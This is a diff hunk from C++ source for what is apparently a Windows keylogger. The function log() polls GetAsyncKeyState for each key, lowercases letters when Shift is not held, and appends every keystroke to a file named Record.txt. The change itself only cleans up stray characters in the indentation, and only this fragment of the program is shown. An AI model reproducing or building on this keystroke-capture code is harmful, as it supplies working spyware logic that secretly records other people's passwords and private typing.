@@ -23,8 +23,8 @@ void log()
        {
             if(GetAsyncKeyState(key) == -32767)
             {
-      ┆        ofstream write("Record.txt", ios::app);
-      ┆        if( (key>64)&&(key<91) && !(GetAsyncKeyState(0x10)) )
+               ofstream write("Record.txt", ios::app);
+               if( (key>64)&&(key<91) && !(GetAsyncKeyState(0x10)) )
                 { 
                      key += 32;
                      write << key;
